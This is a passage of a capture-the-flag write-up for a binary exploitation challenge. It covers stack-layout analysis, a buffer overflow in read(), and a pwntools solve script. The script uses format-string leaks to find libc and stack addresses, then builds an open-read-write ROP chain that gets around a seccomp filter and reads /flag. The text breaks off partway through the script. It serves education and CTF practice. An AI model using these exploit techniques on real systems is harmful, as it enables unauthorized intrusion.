<span class="o">-</span><span class="mo">000000000000012</span><span class="n">C</span>     <span class="kt">int</span> <span class="n">i_0</span><span class="p">;</span>
<span class="o">-</span><span class="mo">000000000000012</span><span class="mi">8</span>     <span class="n">protect1</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
<span class="o">-</span><span class="mo">0000000000000120</span>     <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
<span class="o">-</span><span class="mo">000000000000011</span><span class="mi">8</span>     <span class="kt">size_t</span> <span class="n">datalen</span><span class="p">;</span>
<span class="o">-</span><span class="mo">0000000000000110</span>     <span class="kt">char</span> <span class="n">S</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
<span class="o">-</span><span class="mo">00000000000000</span><span class="mi">90</span>     <span class="kt">char</span> <span class="n">S_backup</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span>
<span class="o">-</span><span class="mo">000000000000000</span><span class="mi">8</span>     <span class="n">_QWORD</span> <span class="n">var_8</span><span class="p">;</span>
<span class="o">+</span><span class="mo">0000000000000000</span>     <span class="n">_QWORD</span> <span class="n">__saved_registers</span><span class="p">;</span>
<span class="o">+</span><span class="mo">000000000000000</span><span class="mi">8</span>     <span class="n">_UNKNOWN</span> <span class="o">*</span><span class="n">__return_address</span><span class="p">;</span>
<span class="o">+</span><span class="mo">0000000000000010</span>
<span class="o">+</span><span class="mo">0000000000000010</span> <span class="c1">// end of stack variables</span>
</pre></table></code></div></div><p>The variable <code class="language-plaintext highlighter-rouge">p</code> lives at <code class="language-plaintext highlighter-rouge">[rbp - 0x128]</code> so the rbp must be <code class="language-plaintext highlighter-rouge">0x7fff64cc3e00+0x128=0x7fff64cc3f28</code>. After that, the <code class="language-plaintext highlighter-rouge">p*</code> now is <code class="language-plaintext highlighter-rouge">0x7fff64cc3e10</code>.</p><p>Because <code class="language-plaintext highlighter-rouge">struct protect1</code> is:</p><div class="language-c nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="mo">00000000</span> <span class="k">struct</span> <span class="n">protect1</span> <span class="c1">// sizeof=0x100</span>
<span class="mo">00000000</span> <span class="p">{</span>
<span class="mo">00000000</span>     <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
<span class="mo">000000</span><span class="mi">80</span>     <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
<span class="mo">00000100</span> <span class="p">};</span>
</pre></table></code></div></div><p>the field <code class="language-plaintext highlighter-rouge">p-&gt;data</code> is at <code class="language-plaintext highlighter-rouge">p + 0x80</code>, so the next read into <code class="language-plaintext highlighter-rouge">p-&gt;data</code> will write to:</p><p><code class="language-plaintext highlighter-rouge">p-&gt;data = 0x7fff64cc3e10 + 0x80 = 0x7fff64cc3e90</code></p><p>Now look at what happens when <code class="language-plaintext highlighter-rouge">key_schedule()</code> returns. The epilogue is the usual <code class="language-plaintext highlighter-rouge">leave; ret</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>mov rsp, rbp    <span class="p">;</span> rsp <span class="o">=</span> 0x7fff64cc3ec0
pop rbp         <span class="p">;</span> rbp <span class="o">=</span> 0x7fff64cc3f28
                <span class="p">;</span> rsp <span class="o">=</span> 0x7fff64cc3ec8
pop rip         <span class="p">;</span> rip <span class="o">=</span> <span class="o">[</span>rsp] <span class="o">=</span> 0x644da6b6d7e4 <span class="o">(</span>main+216<span class="o">)</span>
                <span class="p">;</span> rsp <span class="o">=</span> 0x7fff64cc3ed0
</pre></table></code></div></div><p>So after returning to <code class="language-plaintext highlighter-rouge">main</code>, the stack pointer is at <code class="language-plaintext highlighter-rouge">rsp = 0x7fff64cc3ed0</code>. When <code class="language-plaintext highlighter-rouge">main</code> later calls <code class="language-plaintext highlighter-rouge">read</code>, the CPU executes <code class="language-plaintext highlighter-rouge">call read@plt</code> which pushes the return address at <code class="language-plaintext highlighter-rouge">[rsp - 8]</code>. That means the return address of <code class="language-plaintext highlighter-rouge">read()</code> is stored at: <code class="language-plaintext highlighter-rouge">0x7fff64cc3ec8</code></p><p>At the same time, our buf argument to <code class="language-plaintext highlighter-rouge">read</code> is <code class="language-plaintext highlighter-rouge">p-&gt;data = 0x7fff64cc3e90</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> 0x644da6b6d848 &lt;main+316&gt;    call   <span class="nb">read</span>@plt                    &lt;<span class="nb">read</span>@plt&gt;
        fd: 0 <span class="o">(</span>pipe:[1032699]<span class="o">)</span>
        buf: 0x7fff64cc3e90 ◂— 0x191a1b1c1d1e1f20
        nbytes: 0x80
</pre></table></code></div></div><p>You can easily find that there’s a buffer overflow inside <code class="language-plaintext highlighter-rouge">read()</code>. With 0x38 bytes of padding, we can overwrite the return address of <code class="language-plaintext highlighter-rouge">read()</code> to our ROP chain. Because there’s a <code class="language-plaintext highlighter-rouge">seccomp</code> that blocks <code class="language-plaintext highlighter-rouge">execve/execveat</code>, we have to ORW(open-read-write) flag. I’ll put the string <code class="language-plaintext highlighter-rouge">/flag</code> at the start of the overflow buffer and then use the first ROP chain to read a larger second-stage ROP payload into memory (since the overflowed stack space is quite small). The second stage then opens <code class="language-plaintext highlighter-rouge">/flag</code>, reads, and writes to stdout.</p><details> <summary>Click to view <code>solve.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./chal_patched</span><span class="sh">"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">HOST</span><span class="o">=</span><span class="sh">"</span><span class="s">172.31.14.13</span><span class="sh">"</span>
<span class="n">PORT</span><span class="o">=</span><span class="mi">9999</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
# b*$rebase(0x000000000000152E)
b*$rebase(0x00000000000015C0)
b*$rebase(0x0000000000001848)
b*$rebase(0x000000000000170B)
</span><span class="sh">'''</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
        <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">api</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">p</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">run</span><span class="p">()</span>
<span class="n">info</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">success</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sna</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">msg</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
<span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvn</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">gen</span><span class="p">(</span><span class="n">target_idx</span><span class="p">,</span> <span class="n">desired_byte</span><span class="p">,</span> <span class="n">fmt_string</span><span class="o">=</span><span class="sh">"</span><span class="s">%45$p</span><span class="sh">"</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
    <span class="n">S</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span>
    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">fmt_bytes</span> <span class="o">=</span> <span class="n">fmt_string</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="n">fmt_len</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">fmt_bytes</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">fmt_len</span><span class="p">):</span>
        <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">fmt_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">128</span>
        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">fix_idx</span> <span class="o">=</span> <span class="n">fmt_len</span>
    <span class="n">needed_k</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">S</span><span class="p">[</span><span class="n">fix_idx</span><span class="p">]</span> <span class="o">-</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">128</span>
    <span class="n">key</span><span class="p">[</span><span class="n">fix_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">needed_k</span>
    <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">S</span><span class="p">[</span><span class="n">fix_idx</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">fix_idx</span><span class="p">])</span> <span class="o">%</span> <span class="mi">128</span>
    <span class="n">S</span><span class="p">[</span><span class="n">fix_idx</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">fix_idx</span><span class="p">]</span>
    <span class="n">trigger</span> <span class="o">=</span> <span class="n">desired_byte</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">fix_idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">trigger</span><span class="p">):</span>
        <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">128</span> <span class="o">-</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">128</span>
        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">key</span><span class="p">[</span><span class="n">trigger</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">target_idx</span> <span class="o">-</span> <span class="n">S</span><span class="p">[</span><span class="n">trigger</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="n">next_i</span> <span class="o">=</span> <span class="n">trigger</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="k">if</span> <span class="n">next_i</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">:</span>
        <span class="n">key</span><span class="p">[</span><span class="n">next_i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">S</span><span class="p">[</span><span class="n">next_i</span><span class="p">]</span> <span class="o">-</span> <span class="n">target_idx</span><span class="p">)</span> <span class="o">%</span> <span class="mi">128</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">next_i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
            <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">128</span> <span class="o">-</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">128</span>
    <span class="k">return</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">gen_auto</span><span class="p">(</span><span class="n">targets</span><span class="p">):</span>
    <span class="n">targets</span> <span class="o">=</span> <span class="nf">sorted</span><span class="p">(</span><span class="n">targets</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">targets</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">targets</span><span class="p">[</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">targets</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
             <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Conflict: Byte </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">targets</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span><span class="si">}</span><span class="s"> and </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">targets</span><span class="p">[</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span><span class="si">}</span><span class="s"> are too close (gap &lt; 2).</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">key</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
    <span class="n">S</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span>
    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">last_i</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
    
    <span class="k">for</span> <span class="n">target_idx</span><span class="p">,</span> <span class="n">trigger_byte</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">last_i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">trigger_byte</span><span class="p">):</span>
            <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">128</span> <span class="o">-</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">128</span>
            <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="n">key</span><span class="p">[</span><span class="n">trigger_byte</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">target_idx</span> <span class="o">-</span> <span class="n">S</span><span class="p">[</span><span class="n">trigger_byte</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="n">j</span> <span class="o">=</span> <span class="n">target_idx</span>
        <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">:</span>
            <span class="n">S</span><span class="p">[</span><span class="n">trigger_byte</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">trigger_byte</span><span class="p">]</span>
        <span class="n">reset_idx</span> <span class="o">=</span> <span class="n">trigger_byte</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="n">reset_idx</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">:</span>
            <span class="n">key</span><span class="p">[</span><span class="n">reset_idx</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">S</span><span class="p">[</span><span class="n">reset_idx</span><span class="p">]</span> <span class="o">-</span> <span class="n">target_idx</span><span class="p">)</span> <span class="o">%</span> <span class="mi">128</span>
            <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">S</span><span class="p">[</span><span class="n">reset_idx</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">reset_idx</span><span class="p">]</span>
            <span class="n">last_i</span> <span class="o">=</span> <span class="n">reset_idx</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">last_i</span> <span class="o">=</span> <span class="mi">128</span>

    <span class="k">if</span> <span class="n">last_i</span> <span class="o">&lt;</span> <span class="mi">127</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">last_i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
            <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">128</span> <span class="o">-</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">128</span>
            <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">return</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Enter the key-&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="nf">gen</span><span class="p">(</span><span class="o">-</span><span class="mi">40</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="sh">"</span><span class="se">\n</span><span class="s">%45$p</span><span class="sh">"</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">leak</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvn</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">__libc_start_main</span><span class="sh">'</span><span class="p">]</span> <span class="o">-</span> <span class="mi">243</span>

<span class="n">payload2</span> <span class="o">=</span> <span class="nf">gen</span><span class="p">(</span><span class="o">-</span><span class="mi">40</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="sh">"</span><span class="se">\n</span><span class="s">%35$p</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvn</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">libc: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">stack: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x1e7</span> <span class="o">+</span> <span class="mh">0x128</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">target: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">target</span><span class="o">-</span><span class="mh">0x128</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">target+0x128: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">ret_rc4: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">target</span><span class="o">-</span><span class="mh">0x11f</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">b1: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">target</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span><span class="si">}</span><span class="s">, b2: </span><span class="si">{</span><span class="nf">hex</span><span class="p">((</span><span class="n">target</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="n">my_targets</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">(</span><span class="o">-</span><span class="mi">47</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span> <span class="o">&amp;</span> <span class="mh">0xff00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">),</span>
    <span class="p">(</span><span class="o">-</span><span class="mi">48</span><span class="p">,</span> <span class="n">target</span> <span class="o">&amp;</span> <span class="mh">0x00ff</span><span class="p">)</span>
<span class="p">]</span>

<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000023b6a</span>
<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000000000002601f</span>
<span class="n">pop_rdx_r12</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000119431</span>
<span class="n">pop_rcx_rbx</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000000000010257e</span>
<span class="nb">open</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">open</span><span class="sh">'</span><span class="p">]</span>
<span class="n">sendfile</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">sendfile</span><span class="sh">'</span><span class="p">]</span>
<span class="n">read</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">]</span>
